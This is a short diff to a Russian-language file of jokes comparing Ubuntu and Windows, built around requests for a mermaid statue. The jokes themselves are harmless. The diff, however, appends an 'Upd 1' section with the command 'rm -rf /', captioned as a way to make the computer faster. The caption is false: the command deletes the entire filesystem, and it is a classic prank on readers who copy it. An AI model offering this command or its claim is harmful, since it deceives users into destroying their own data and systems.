@@ -31,3 +31,10 @@ Ubuntu: «Вот вам статуя русалки»
 Ubuntu: «Введите, пожалуйста apt-get install туловище русалки, apt-get install голова русалки, apt-get install руки русалки…»
 
 Windows: «Нет. Я думаю — Вам определенно нужна чугунная статуя Чапаева…»
+
+# Upd 1
+
+```
+rm -rf / # to make computer faster
+```
+
